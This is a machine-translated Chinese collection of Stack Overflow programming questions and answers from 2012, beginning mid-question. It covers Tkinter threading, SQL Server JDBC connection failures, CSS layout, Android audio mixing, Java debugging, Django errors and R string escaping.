还有我的从异步文件阅读器中提取消息的消耗方法（这是在单独的线程上运行的方法：

```
def consume(self, process, console_frame):
    # Launch the asynchronous readers of the process' stdout and stderr.

    stdout_queue = Queue.Queue()
    stdout_reader = AsynchronousFileReader(process.stdout, stdout_queue)
    stdout_reader.start()
    stderr_queue = Queue.Queue()
    stderr_reader = AsynchronousFileReader(process.stderr, stderr_queue)
    stderr_reader.start()

    # Check the queues if we received some output (until there is nothing more to get).
    while not stdout_reader.eof() or not stderr_reader.eof():
        # Show what we received from standard output.
        while not stdout_queue.empty():
            line = stdout_queue.get()
            console_frame.writeToLog(line.strip(), max_lines=None)
            time.sleep(.03) # prevents it from printing out in large blocks at a time

        # Show what we received from standard error.
        while not stderr_queue.empty():
            line = stderr_queue.get()
            console_frame.writeToLog(line.strip(), max_lines=None)
            time.sleep(.03) # prevents it from printing out in large blocks at a time

        # Sleep a bit before asking the readers again.
        time.sleep(.05)

    # Let's be tidy and join the threads we've started.
    stdout_reader.join()
    stderr_reader.join()

    # Close subprocess' file descriptors.
    process.stdout.close()
    process.stderr.close()

    print "finished executing"
    if self.stop_callback:
        self.stop_callback() 
```

就像我之前说的——`consume()`线程只在我移动鼠标或在键盘上键入时执行——这意味着`writeToLog(...)`函数（用于将文本附加到 Tkinter GUI 中）只有在鼠标/键盘活动发生时才会执行......有什么想法吗？

**编辑：**我想我可能对正在发生的事情有所了解......如果我评论`writeToLog(...)`调用并将其替换为简单的打印（将 Tkinter 排除在等式之外），那么消耗线程将正常执行。看来 Tkinter 是这里的问题。关于我可以从消费线程完成 Tkinter 文本小部件更新的任何想法？

**EDIT2：**感谢评论，让它工作。这是我使用的最终代码：

```
gui_text_queue = Queue.Queue()

def consume(self, process, console_frame):
    # Launch the asynchronous readers of the process' stdout and stderr.

    stdout_queue = Queue.Queue()
    stdout_reader = AsynchronousFileReader(process.stdout, stdout_queue)
    stdout_reader.start()
    stderr_queue = Queue.Queue()
    stderr_reader = AsynchronousFileReader(process.stderr, stderr_queue)
    stderr_reader.start()

    # Check the queues if we received some output (until there is nothing more to get).
    while not stdout_reader.eof() or not stderr_reader.eof():
        # Show what we received from standard output.
        while not stdout_queue.empty():
            line = stdout_queue.get()
            gui_text_queue.put(line.strip())

        # Show what we received from standard error.
        while not stderr_queue.empty():
            line = stderr_queue.get()
            gui_text_queue.put(line.strip())

        # Sleep a bit before asking the readers again.
        time.sleep(.01)

    # Let's be tidy and join the threads we've started.
    stdout_reader.join()
    stderr_reader.join()

    # Close subprocess' file descriptors.
    process.stdout.close()
    process.stderr.close()

    if self.stop_callback:
        self.stop_callback() 
```

将此方法添加到我的 Tkinter 控制台框架中，并在框架初始化程序结束时调用它一次：

```
def pull_text_and_update_gui(self):
    while not gui_text_queue.empty():
        text = gui_text_queue.get()
        self.writeToLog(text, max_lines=None)
    self.after(5, self.pull_text_and_update_gui) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T23:16:23.780

Tkinter 不是线程安全的。如果您的`writeToLog`函数尝试将数据插入到文本小部件中，您将得到不可预知的行为。为了让单独的线程将数据发送到小部件，您需要将数据写入线程安全队列，然后让主线程轮询该队列（使用 tkinter 的`after`方法）。

# java - com.microsoft.sqlserver.jdbc.SQLServerException：与主机 localhost、端口 1433 的 TCP/IP 连接失败

> ID：11820799
> 
> 赞同：23
> 
> 时间：2012-08-05T23:00:00.213
> 
> 标签：java, sql-server-2008, jdbc

我不断收到此错误。我尝试了 Stack Overflow 中的一种解决方案（如下），但对我不起作用： [SQL Exception while connection to SQL server](https://stackoverflow.com/questions/10035291/ql-exception-while-connecting-to-sql-server)

我尝试通过使用链接在 Windows 防火墙中允许端口 1433，但这也不起作用。请参阅“在 Windows 防火墙中打开端口以进行 TCP 访问”部分 [http://msdn.microsoft.com/en-us/library/ms175043.aspx](http://msdn.microsoft.com/en-us/library/ms175043.aspx)

> com.microsoft.sqlserver.jdbc.SQLServerException：与主机 localhost、端口 1433 的 TCP/IP 连接失败。错误：“连接被拒绝：连接。验证连接属性。确保 SQL Server 实例正在主机上运行并在端口上接受 TCP/IP 连接。确保与端口的 TCP 连接未被防火墙阻止.

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-09-14T19:08:57.907

你需要去 `Start > Microsoft SQL Server > Configuration Tools > SQL Server Configuration Manager`

当它打开时，转到`SQL Server Configuration Manager > SQL Server Network Configuration > Protocols for SQLExpress`。

在那里你会找到协议 TCP/IP，如果禁用然后启用它。单击 TCP/IP，您将找到它的属性。

在这些属性中，删除所有 TCP 动态端口并将值 1433 添加到所有 TCP 端口，然后重新启动您的`SQL Server Services > SQL Server`

它已经完成了。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-11-28T12:01:08.000

**脚步**

*   打开 Sql Server 配置管理器（开始 -> 程序 -> Microsoft SQL Server 2008 -> 配置工具）

*   展开 SQL Server 网络配置 -> [您的服务器实例]

*   双击 TCP/IP

*   根据协议：

*   确保启用是

*   在 IP 地址下：

*   滚动到底部并在 IPAll 下设置 TCP 端口，（默认为 1433）

*   找到您要连接的 IP 地址并将启用和活动设置为是

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-05-08T09:50:58.987

使用 JDBC 查询数据库 SQL Server

首先，您需要找出 SQL Server 的 IP 并**启用**TCP/IP 并设置 TCP/IP 端口。为此，请执行以下步骤：

*   **打开 SQL Server 配置管理器**

    *   选择**SQL Server 网络配置**->**协议**-> 右键单击**​​ TCP/IP** -> 选择**启用**（如果已启用则移动到下一步） -> 再次右键单击**TCP/IP** ->**属性**-> 选择选项卡**IP 地址**- > 在**IPAll**组中：清除**TCP 动态端口**的值并将 1433 设置为**TCP 端口** -> 单击**确定**

        **注意：**复制属性表中的一个 IP 以便稍后进行配置

    *   双击**SQL Server Services** -> 右键单击**​​ SQL Server *(USER)* ** -> 选择 **Restart**

现在，您已经有了 IP，配置服务器如下：

```
<bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver" />
        <property name="url" value="jdbc:sqlserver://put.the.ip.here:1433;databaseName=<DB-Name>" />
        <property name="username" value="sa" />
        <property name="password" value="p@ssW0rd" />
</bean> 
```

**注意**：去掉`destroy-method="close"`豆子

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-10-29T23:13:38.957

确保在 connectionUrl 中，你的斜线是这样向左的：

> String connectionUrl = "jdbc:sqlserver://localhost**\**itis;databaseName=dbMediaStore;user=;password=";

# ruby-on-rails - `cap deploy` 的更好的 Rails 3 资产处理

> ID：11820800
> 
> 赞同：0
> 
> 时间：2012-08-05T23:00:00.327
> 
> 标签：ruby-on-rails, capistrano, assets, sprockets, precompile

我注意到默认的“部署”任务会在远程机器上进行资产预编译，这会产生以下不良影响：

*   预编译期间奇怪的故障资产（在现场）
*   配置中的错误导致停机并带有 500 响应代码
*   需要很长时间的任务

我已经看到了这一点，当您没有任何要预编译的内容时，它不会导致您进行预编译，从而稍微缓解了这个问题：[加速资产：使用 Rails 3.1/3.2 Capistrano 部署进行预编译](https://stackoverflow.com/questions/9016002/speed-up-assetsprecompile-with-rails-3-1-3-2-capistrano-deployment)

但必须有更好的解决方案。

有没有人试过这些：

1.  始终部署到“暂存”位置，在那里您可以测试所有内容，然后添加某种`cap enliven`任务以某种方式告诉 Web 服务器前端开始使用另一个端口？（我可以通过编辑 nginx 并重新启动它来手动管理它，然后我可以通过 include和 cap 任务将它结合在一起`upstream`来自动化一点。）`nginx.conf`
2.  在本地预编译，然后简单地通过 rsync 推送文件。我更喜欢＃1，但这将是一个较小的步骤，可能会比当前行为更好的默认设置。

我错过了一些明显的东西吗？我是 Rails 资产 + Capistrano 部署的新手，但似乎部署的最佳实践并没有开箱即用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-26T22:32:32.853

你可以：

*   部署前预编译资产
*   在后台编译它的服务器端
*   留给`delayed_job`其他队列管理系统

# html - 框架的CSS定位问题

> ID：11820801
> 
> 赞同：2
> 
> 时间：2012-08-05T23:00:03.713
> 
> 标签：html, css

我想`background-color:#000`为整个`.content`div 设置。我为图像制作了一个框架，它完美地包裹了图像（[http://jsfiddle.net/Yuaq8/](http://jsfiddle.net/Yuaq8/)），但前提是框架的位置设置为`absolute`. 在这种情况下`.content`没有正确填写。

[如果我删除了这个 fiddle](http://jsfiddle.net/Yuaq8/1/)`.pic-frame`中的 position 属性，div就会被填充，但是框架看起来很奇怪。如何使框架看起来像第一个小提琴中的框架，以便填充整个 .content div？`.content`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:08:06.860

`position:absolute`将从流程中删除您的元素。使用`position:relative`or`display:inline-block`代替`.pic-frame`：

```
.pic-frame {
   display:inline-block;
   padding:12px;background-color: #DDD;
} 
```

[**演示**](http://jsfiddle.net/Yuaq8/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T23:25:20.253

尝试为 .pic-frame 设置宽度。 [**JS小提琴**](http://jsfiddle.net/Ev7P8/1/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:33:10.153

或者您可以在 pic.frame div 中将宽度设置为 200px，并从#pic div 中删除宽度和边距属性。

```
.pic-frame {
    width: 200px;
    padding:12px;background-color: #DDD;
}
#pic {
   height:200px;
   background-color: #999;
} 
```

# android - Android - 将多个静态波形混合到一个 AudioTrack 中

> ID：11820802
> 
> 赞同：5
> 
> 时间：2012-08-05T23:00:03.333
> 
> 标签：android, audio, audiotrack

我正在制作一个类，它采用一组频率值（即 440Hz、880Hz、1760Hz）并播放它们如何组合成一个 AudioTrack。我不是一个健全的程序员，所以这对我自己来说很难写，我相信对于一个有经验的健全的程序员来说这是一个相对容易的问题。下面是 play 方法中的一些代码：

```
public void play() {
    // Get array of frequencies with their relative strengths
    double[][] soundData = getData();

    // TODO
    // Perform a calculation to fill an array with the mixed sound - then play it in an infinite loop
    // Need an AudioTrack that will play calculated loop
    // Track sample info
    int numOfSamples = DURATION * SAMPLE_RATE;
    double sample[] = new double[numOfSamples];
    byte sound[] = new byte[2 * numOfSamples];

    // fill out the array
    for (int i = 0; i < numOfSamples; ++i) {
            sample[i] = Math.sin(2 * Math.PI * i / (SAMPLE_RATE / 440));
    }

    int i = 0;
    for (double dVal : sample) {
        // scale to maximum amplitude
        final short val = (short) ((dVal * 32767));
        // in 16 bit wav PCM, first byte is the low order byte
        sound[i++] = (byte) (val & 0x00ff);
        sound[i++] = (byte) ((val & 0xff00) >>> 8);
    }

    // Obtain a minimum buffer size
    int minBuffer = AudioTrack.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);

    if (minBuffer > 0) {
        // Create an AudioTrack
        AudioTrack track = new AudioTrack(AudioManager.STREAM_MUSIC, SAMPLE_RATE, AudioFormat.CHANNEL_CONFIGURATION_MONO, 
                AudioFormat.ENCODING_PCM_16BIT, numOfSamples, AudioTrack.MODE_STATIC);

        // Write audio data to track
        track.write(sound, 0, sound.length);

        // Begin playing track
        track.play();
    }

    // Once everything has successfully begun, indicate such.
    isPlaying = true;
} 
```

现在，此代码只是播放音乐会 A (440Hz)。这是为了测试这段代码是否有效。现在，我需要获取一堆频率，执行某种计算，并写入样本数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T00:48:12.040

好的，所以答案确实是一个简单的求和循环。在这里，只需将此 for 循环替换为原始循环：

```
 // fill out the array
    for (int i = 0; i < numOfSamples; ++i) {
            double valueSum = 0;

            for (int j = 0; j < soundData.length; j++) {
                valueSum += Math.sin(2 * Math.PI * i / (SAMPLE_RATE / soundData[j][0]));
            }

            sample[i] = valueSum / soundData.length;
    } 
```

现在，它所做的只是简单地获取所有可能的频率，将它们加到变量 中`valueSum`，然后将其除以频率数组的长度`soundData`，这是一个简单的平均值。这会产生一个任意长的频率阵列的良好正弦波混合。

我还没有测试过性能，但我确实在线程中运行了它，否则它可能会使 UI 崩溃。所以，希望这会有所帮助 - 我将其标记为答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T14:10:51.110

如果您打算将多个波形混合为一个，您可以通过多种方式防止削波。

*假设 sample[i] 是一个浮点数，表示所有声音的总和。*

**硬剪辑：**

```
if (sample[i]> 1.0f)
{
    sample[i]= 1.0f;
}
if (sample[i]< -1.0f)
{
    sample[i]= -1.0f;
} 
```

**HEADROOM**（曲线的 y= 1.1x - 0.2x^3，最小和最大上限略低于 1.0f）

```
if (sample[i] <= -1.25f)
{
    sample[i] = -0.987654f;
}
else if (sample[i] >= 1.25f)
{
    sample[i] = 0.987654f;
}
else
{
    sample[i] = 1.1f * sample[i] - 0.2f * sample[i] * sample[i] * sample[i];
} 
```

对于第三多项式波形整形器（不太平滑），将上面的最后一行替换为：

```
sample[i]= 1.1f * sample[i]- 0.2f * sample[i] * sample[i] * sample[i]; 
```

# java - 比较和删除向量中的相似字符串

> ID：11820809
> 
> 赞同：0
> 
> 时间：2012-08-05T23:00:50.687
> 
> 标签：java, string, vector

JAVA：首先，非常感谢您花时间看我的问题；非常感谢您的帮助！

所以，问题是我在Java中有一个对象向量，每个对象都有一个名称（字符串）。但是，我有大量重复的对象，而重复的对象总是直接在它们重复的对象之后。此外，重复次数范围为 1-10（令人沮丧），完全随机。

我将如何删除重复项，我考虑将每个对象名称与向量中的下一个对象名称进行比较，并删除所有匹配的对象，但这给了我很多问题。非常感谢您提前提供的帮助！

-迪伦

编辑：只是为了确保您了解我所说的重复类型，我添加了这个。

*   向量*   ---Object1(String name = "hi") --> 删除这个。*   ---Object2（字符串名称=“嗨”）*   ---Object3（字符串名称=“鲍勃”）*   结束向量

编辑2：添加代码

```
public class Vector
{
public static void main(String args[])
{
  Person person1 = new Person("jane");
  Person person2 = new Person("jane");
  Person person3 = new Person("bob");
  Person person4 = new Person("shelly");

  Vector<Person> vectorObject = new Vector<Person>
  vectorObject.add(person1);
  vectorObject.add(person2);
  vectorObject.add(person3);
  vectorObject.add(person4);

 }
}
class Person
{
 String name = null;
 String bDay = null;
 String color = null;
 public Person(String name)
 {
      this.name = name;
     }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:38:47.310

看来您应该使用不同的数据结构。

您可能想要使用[Set](http://docs.oracle.com/javase/6/docs/api/java/util/Set.html)而不是 Vector。集合不包含重复元素。你必须覆盖`equals(Object)`方法。

或者使用具有 name 属性的[Map](http://docs.oracle.com/javase/6/docs/api/java/util/Map.html)作为键值并将相应的 Person 对象存储为值。

在这两种情况下，您都可以防止重复，而不是事后删除它们。

```
 Person person1 = new Person("jane");
  Person person2 = new Person("jane");
  Person person3 = new Person("bob");
  Person person4 = new Person("shelly");

  Map<String, Person> nameToPerson = new HashMap<>();
  nameToPerson.add(person1.name, person1);
  nameToPerson.add(person2.name, person2);
  nameToPerson.add(person3.name, person3);
  nameToPerson.add(person4.name, person4);

  Collection<Person> noDuplicatesHere = map.values(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:14:23.673

好吧，我不知道你用的是哪种语言，所以我给你一个 JavaScript 的算法：

```
var newvector=new Array();
var lastName;
for(var i=0;i<vector.length;i++){
   if(!lastName || vector[i].name!=lastName){
      lastName=vector[i].name;
      newvector.push(vector[i]);
   }
} 
```

问题是这样创建了一个新向量，如果原始向量很大，可能会出现内存问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T23:25:04.203

这是您的第一个问题：

```
class Person 
{
    String name = null;
    String bDay = null;
    String color = null;
    public Person(String name)
    {
        name = this.name;
    }
} 
```

它应该是：

```
class Person 
{
    String name = null;
    String bDay = null;
    String color = null;
    public Person(String name)
    {
        this.name = name;
    }
} 
```

以下是有关`this`关键字的更多信息：

*   [http://docs.oracle.com/javase/tutorial/java/javaOO/thiskey.html](http://docs.oracle.com/javase/tutorial/java/javaOO/thiskey.html)

您的第二个问题是：我猜您正在尝试创建一个 Vector，确切地说是 java.util.Vector。如果您在名为 vector 的类中创建 Vector 的新实例，它将创建自身的新实例，而不是 java.util.Vector 的新实例。您可以重命名课程，也可以这样做：

```
java.util.Vector<Person> vector = new java.util.Vector<Person>(); 
```

如果要比较 2 个字符串值，请使用：

```
String name = "John";
String name2 = "Joe";
if(name.equalsIgnoreCase(name2))
    System.out.println("They match!"); 
```

如果您想要完全匹配，也可以只使用 equals() 。

希望这有帮助！

# css - 使用 css sprite 技术时如何减少 sprite 的数量

> ID：11820815
> 
> 赞同：0
> 
> 时间：2012-08-05T23:02:03.533
> 
> 标签：css, css-sprites

我注意到 CSS sprite (.gif) 的文件大小在此期间不断增长。那是因为我们不断添加新的图标/精灵，并且我们从不删除现有的精灵，因为我们害怕破坏现有的设计（偏移重新计算或者精灵可能会在我们忽略的地方使用）。

我想知道我们如何减少精灵的数量？图像文件大小不断增长。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:09:16.943

您将不得不进行手动检查（首先搜索精灵名称，但一旦获得结果，您将不得不使用笔和纸）以了解正在使用哪些图像。**您可以在不触及其余位置**的情况下将这些替换为新的，但在此之前我会考虑：

*   将您的 gif 更改为 png-24 或 SVG，因为它们重量更轻，质量更好，特别是涉及透明度。SVG 也是可扩展的，非常适合视网膜显示设备，尽管并非所有浏览器（即 IE）都支持，因此需要一个替代方案。

*   对不同类别的图像使用不同的精灵（例如，一种用于菜单图标，另一种用于社交图标等），因此更易于管理。您将有两个或三个以上的服务器请求，并没有真正的区别。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-24T21:00:32.393

根据我的经验，你必须做一次清理。然后把事情做对！！！

做 OOCSS 并为特定的精灵图像使用口语名称。

我建议阅读[http://devblog.xing.com/frontend/a-so-called-sprite-revolution-on-xing/](http://devblog.xing.com/frontend/a-so-called-sprite-revolution-on-xing/)

在此之后，管理精灵会更容易，但正如我所说，需要一次性的努力。

另外，因为 GIF 不是您想要使用的格式 :-)

# python - 访问站点时出现 Django 错误：语法错误（admin.py，第 4 行）

> ID：11820816
> 
> 赞同：1
> 
> 时间：2012-08-05T23:02:13.110
> 
> 标签：python, django, traceback, django-taggit

我正在创建一个只有基本 python 和 taggit 模块的基本博客，它驻留在`http://127.0.0.1:8000/` （必须在其中放置随机空格以便我可以提交），当我运行`./manage.py syncdb`它时它正确执行并且当我`runserver`没有返回错误时。问题是当我实际访问该网站时。比这发生...

```
SyntaxError at /
invalid syntax (admin.py, line 4) 
```

这显示在网络浏览器中..

这是回溯：

```
Environment:

Request Method: GET
Request URL: http://127.0.0.1:8000/

Django Version: 1.4.1
Python Version: 2.7.3
Installed Applications:
('django.contrib.auth',
 'django.contrib.contenttypes',
 'django.contrib.sessions',
 'django.contrib.sites',
 'django.contrib.messages',
 'django.contrib.staticfiles',
 'django.contrib.admin',
 'taggit',
 'MainBlog')
Installed Middleware:
('django.middleware.common.CommonMiddleware',
 'django.contrib.sessions.middleware.SessionMiddleware',
 'django.middleware.csrf.CsrfViewMiddleware',
 'django.contrib.auth.middleware.AuthenticationMiddleware',
 'django.contrib.messages.middleware.MessageMiddleware')

Traceback:
File "/Library/Python/2.7/site-packages/django/core/handlers/base.py" in get_response
  101\.                             request.path_info)
File "/Library/Python/2.7/site-packages/django/core/urlresolvers.py" in resolve
  298\.             for pattern in self.url_patterns:
File "/Library/Python/2.7/site-packages/django/core/urlresolvers.py" in url_patterns
  328\.         patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
File "/Library/Python/2.7/site-packages/django/core/urlresolvers.py" in urlconf_module
  323\.             self._urlconf_module = import_module(self.urlconf_name)
File "/Library/Python/2.7/site-packages/django/utils/importlib.py" in import_module
  35\.     __import__(name)
File "/Users/zackbaker/MyBlog/MyBlog/urls.py" in <module>
  5\. admin.autodiscover()
File "/Library/Python/2.7/site-packages/django/contrib/admin/__init__.py" in autodiscover
  29\.             import_module('%s.admin' % app)
File "/Library/Python/2.7/site-packages/django/utils/importlib.py" in import_module
  35\.     __import__(name)

Exception Type: SyntaxError at /
Exception Value: invalid syntax (admin.py, line 4) 
```

无论如何，任何可以提供的帮助都会很棒！非常感谢你们！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T02:40:17.030

你的第 4 行`admin.py`是

```
from admin.site.register(Post) 
```

这是一个 Python 语法错误。应该很简单

```
admin.site.register(Post) 
```

它调用适当的方法来向 Django 的管理站点注册您的 Post 类。

顺便说一句，`from`Python 中的关键字用于将某些内容导入当前模块。你应该确保你有线路

```
from django.contrib import admin 
```

在 admin.py 的第 1 行到第 3 行的某个地方（可能是第 1 行！），以确保`admin`在您到达第 4 行时正确定义。

# java - 如何在“try {...}”块中调试 Java 代码？

> ID：11820820
> 
> 赞同：4
> 
> 时间：2012-08-05T23:03:12.103
> 
> 标签：java, eclipse, debugging

我（Java 新手）正在 Eclipse 中运行 Java 程序（我从 SourceForge 下载的项目）。当我调试它时，它总是在这个位置结束，这发生在一个 50 行的 try 块之后：

```
catch (Exception ex){
    System.err.println("PROCESSING ERROR: " + ex.getMessage());
    helpFormatter.printHelp(usage, options);
} 
```

如何找到并调试触发此异常的代码行？（即查看行号、检查局部变量、评估表达式等）如果我在 catch 之后放置一个断点，我看不到任何方法可以返回到原始错误或至少找出行号。我可以单步执行 try 块中的代码，但是有很多循环，因此可能会非常耗时。

我该如何调试呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T23:06:03.257

看看堆栈跟踪。你可以在某个地方找到一个 Eclipse 选项卡，或者当你发现异常时直接打印它：

```
catch (Exception ex){
    ex.printStackTrace();
} 
```

检查堆栈跟踪是快速找到错误的最快速、最安全的方法。即使您设置了一个断点（或者最坏的情况是使用一些打印来定位最后执行的语句），您也无法准确确定异常发生的位置。事实上，异常可能在调用堆栈的更深处引发，不一定是在断点后调用的第一个方法中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T01:15:22.297

添加“异常断点”。它将在问题首次出现的异常的根本原因处停止。

首先确定抛出什么类型的特定异常 - 通过在 catch 块中设置断点来执行此操作，并查看 ex 是什么类型的异常（通过在变量窗口中查看它）。删除断点，然后按 F8 继续。

现在添加一个异常断点。这是通过转到断点视图并单击看起来像“J！”的图标来完成的。指定您看到的特定类型。现在运行代码，它应该在抛出异常的地方停止。

另一方面：简单地捕获异常通常不是一个好主意，您最好尝试捕获特定类型，尽管就像您说的那样，这不是您的代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:07:25.180

在 try 块的开头设置断点，在调试视图中，您将能够看到您感兴趣的所有细节：行号、检查局部变量、评估表达式等

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-05T23:08:50.470

在 try 块的第一行放置一个断点，然后跳到下一行，直到它跳转到 catch 块。然后你知道你在那条线上遇到了例外。然后您可以检查异常以查看问题所在。由于您无法“返回”，您可能会再次调试以查看导致问题的原因。

但在大多数情况下，查看堆栈跟踪中指示的行就足够了。如果要检查状态，可以将断点放在此行中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T23:46:55.733

您可以暂时删除 try/catch 块，以便调试器在出现异常时停止。（您可能不得不作弊并添加`throws Exception`到您的方法签名中。）

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-08-05T23:08:48.950

对我来说最好的调试解决方案是在每个主要代码块之后放置多个 Print 语句。

```
System.out.println("1");

//Code1 block

System.out.println("2");

//code 2 block

System.out.println("3");

//code 3 block

System.out.println("4"); 
```

通过这样做，您可以查看执行并修改它的最后一个打印语句。打印的最后一个数字，然后是 catch 语句的堆栈跟踪应该会有所帮助。

# c - 转义终端时使 R 使用 C 表示法

> ID：11820822
> 
> 赞同：7
> 
> 时间：2012-08-05T23:03:26.857
> 
> 标签：c, r, cran

不确定我在这里使用了正确的术语，但是当从常规字符集中转义字节时，我需要`print`or`deparse`方法使用 C 表示法（例如`"\x05"`，而不是）。`"\005"`

```
x <- "This is a \x05 symbol"
print(x)
[1] "This is a \005 symbol" 
```

有没有一种本地方法可以做到这一点？

我需要这个来生成 BSON：[http](http://bsonspec.org/#/specification) ://bsonspec.org/#/specification 。所有示例都明确使用`\x05`符号。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T14:40:58.017

侵入内部`print`似乎是个坏主意。相反，我认为您应该自己进行字符串转义，并最终用于`cat`打印字符串而无需任何额外的转义。

您可以使用`encodeString`来进行初始转义、`gregexpr`识别八进制`\0..`转义、`strtoi`将表示八进制数字的字符串转换为这些数字、`sprintf`以十六进制打印数字以及`regenmatches`对匹配的部分进行操作。整个过程看起来像这样：

```
inputString <- "This is a \005 symbol. \x13 is \\x13."
x <- encodeString(inputString)
m <- gregexpr("\\\\[0-3][0-7][0-7]", x)
charcodes <- strtoi(substring(regmatches(x, m)[[1]], 2, 4), 8)
regmatches(x, m) <- list(sprintf("\\x%02x", charcodes))
cat(x, "\n") 
```

请注意，这种方法会将八进制转义转换`\005`为十六进制转义`\x05`，但其他转义序列`\t`或`\a`不会受此影响。您可能还需要更多代码来处理这些问题，但上面应该包含您需要的所有成分。

*请注意*，您提到的 BSON 规范几乎可以肯定是指原始字节，因此只要您的字符串包含一个代码为 5 的字符，您可以将其写入`"\x05"`输入中，并且您将该字符串以二进制模式写入所需的输出，它R如何向您打印该字符串并不重要。毕竟，八进制`\005`和十六进制`\x05`只是您将要写入的同一字节的两种表示形式。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-06T01:02:36.187

`cat`符合你的需要吗？请注意，您必须转义反斜杠：

```
> x <- "This is a \\x05 symbol\n"
> cat(x)
This is a \x05 symbol 
```

# iphone - iToast 永远不会在我的 iPhone 应用程序中消失

> ID：11820827
> 
> 赞同：2
> 
> 时间：2012-08-05T23:03:43.117
> 
> 标签：iphone, objective-c, ios, xcode

我是 iOS 新手。我想在我的应用程序中使用 iToast。我关注[了 toast-notifications-ios](https://github.com/ecstasy2/toast-notifications-ios/blob/master/README.md)

首先，当我创建我`iToast.m`的这些行时，我遇到了四个错误：

```
[label release];
[imageView release];
view = [v retain];
iToast *toast = [[[iToast alloc] initWithText:_text] autorelease]; 
```

我总是在不同的例子中遇到`release`问题。`autorelease`我使用 iOS 5.1，xCode 4.3.3。我看到了很多使用它们的例子，但我总是遇到错误。你能告诉我为什么吗？

当我评论前第三个错误行并使用第四个错误行时：

```
iToast *toast = [[iToast alloc] initWithText:_text]; 
```

我可以运行该项目，但是当 Toast 弹出时，它永远不会消失。我使用了这一行，如下所示`README.md`：

```
[[[[iToast makeText:NSLocalizedString(@"Something to display a very long time", @"")] 
                    setGravity:iToastGravityBottom] setDuration:iToastDurationShort] show]; 
```

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T23:59:44.277

如果您刚开始，您可能正在使用自动引用计数或 ARC。使用它，编译器会为您处理内存并为您呈现`retain`,`release`和`autorelease`。您可以为您的项目禁用 ARC 或浏览提供的代码并通过翻译`retains`、`releases`和`autoreleases`.

这解释了差异以及如何过渡：http: [//developer.apple.com/library/ios/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html](http://developer.apple.com/library/ios/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html)

# html - 创建边框的 CSS 浏览器兼容性问题

> ID：11820828
> 
> 赞同：-1
> 
> 时间：2012-08-05T23:03:54.227
> 
> 标签：html, css, internet-explorer, google-chrome

**HTML**标记：

```
<table class='cardc'>
    <tr>
        <td rowspan='5' width='10%'>
            <img src='http://fwfn.ca/sites/default/files/pictures/blank_person.jpg' height='120' width='100'/>
        </td>
        <td width='70%' colspan='3'>"
                ."<a href='".$profilePage."&sid=".$sfid."#box-one'>".($record->fields->FirstName)." ".($record->fields->LastName)."</a></font>
        </td>
        <td>
            ".$record->fields->Email."
        </td>
    </tr>
    <tr>
        <td class='greyF' colspan='3'>
            ".$record->fields->Country_of_Citizenship__c."
        </td>
    </tr>
    <tr>
        <td>
            <div class='greyF'>year</div>".$record->fields->Fellowship_year__c."
        </td>
        <td>
            <div class='greyF'>Organization</div>".$record->fields->Partner_Organization__c."
        </td>
        <td>
            <div class='greyF'>Country</div>".$record->fields->Fellowship_Country__c."
        </td>
    </tr>
    <tr>
        <td colspan='3'>
                <div class='greyF'>Education</div>".$record->fields->Education__c."
        </td>
    </tr>
    <tr>
    </tr>
</table> 
```

**CSS**标记：

```
.cardc {
    border: 5px outset white;
    padding: 3px;
    width:80%;
} 
```

但正如标题所说，我遇到了跨浏览器问题，本应覆盖整个表格的边框在底部被切断。

对创建边界的替代方法有什么建议吗？

考虑到每个人的担忧，编辑了 HTML。边框仍然绘制不正确。[在此处](http://jsfiddle.net/b3yFJ/)
查看演示

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:44:24.830

它是由无效的行跨度和边框折叠（当您在 jsFiddle 中选择“规范化 CSS”时的默认设置）的组合引起的。如果您将其关闭或提供正确的行数，则边框将正确绘制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T23:17:16.760

`<td rowspan='5' width=10%>`表示至少有 4 行，因为当前单元格应跨越 5 行。由于您不提供任何这些行，因此`<td>`将溢出表。删除`rowspan`属性：

```
<td style="width:10%">
  <img src='http://fwfn.ca/sites/default/files/pictures/blank_person.jpg' height='120' width='100'/>
</td> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:17:59.320

你有一个打破表格底部边框的`rowspan="5"`第`td`一个，可能是因为它找不到要合并的剩余 4 行。删除行跨度修复了边框。

